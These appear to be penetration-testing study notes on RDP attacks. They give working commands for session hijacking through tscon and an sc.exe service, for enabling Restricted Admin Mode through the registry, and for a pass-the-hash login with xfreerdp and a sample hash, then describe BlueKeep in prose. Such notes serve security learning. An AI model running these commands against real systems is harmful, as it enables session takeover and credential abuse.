## Enumeration

Refer to Service enumeration.

## Protocol Specific Attacks

### RDP Session hijacking

To successfully impersonate a user without their password, we need to have `SYSTEM` privileges.

```powershell
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local administrative privileges, we can escalate to `SYSTEM`. Simple trick - Use Windows service that, by default, run as `Local System` and executes any binary with `SYSTEM` privileges.

```powershell
## Check sessions
query user

## Session hijack
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

## Start session
net start sessionhijack
```

## RDP Pass-the-Hash (PtH)

Caveats:

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host.

    This can be enabled with the following:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
## PtH
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

## Noticeable FTP Vulnerability

## CVE-2019-0708 (BlueKeep)

Vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a Use-After-Free (UAF) technique that uses freed memory to execute arbitrary code.

After the function has been exploited and the memory has been freed, data is written to the kernel, which allows us to overwrite the kernel memory. This memory is used to write our instructions into the freed memory and let the CPU execute them.

